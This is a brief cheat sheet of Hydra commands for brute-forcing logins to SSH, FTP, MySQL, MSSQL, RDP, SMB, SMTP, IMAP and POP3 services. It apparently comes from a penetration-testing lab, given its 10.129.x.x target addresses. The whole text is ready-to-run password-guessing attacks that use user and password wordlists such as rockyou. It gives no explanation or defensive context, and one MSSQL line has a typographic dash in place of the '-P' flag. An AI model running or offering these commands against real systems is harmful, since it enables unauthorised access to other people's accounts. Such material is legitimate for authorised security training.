### SSH
```shell
hydra -L user.list -P password.list ssh://10.129.42.197 -t 64
```
### FTP
```
hydra -L users.list -P passwords.list ftp://10.129.203.6 -s 2121 -t 4
```
### MySQL
```
hydra -L usernames.txt -P pass.txt <ip> mysql
```
### MSSQL
```
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
```
### RDP
```shell
hydra -L user.list -P password.list rdp://10.129.42.197
```
### SMB
```shell
hydra -L user.list -P password.list smb://10.129.42.197
```
### SMTP
```
hydra -L user.list -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.12 -f
```
### IMAP
```
hydra -L user.list -P /path/to/passwords.txt -f <IP> imap -V
```
### POP3
```
hydra -L users.list -P pws.list -f 10.129.238.158 pop3 -V
```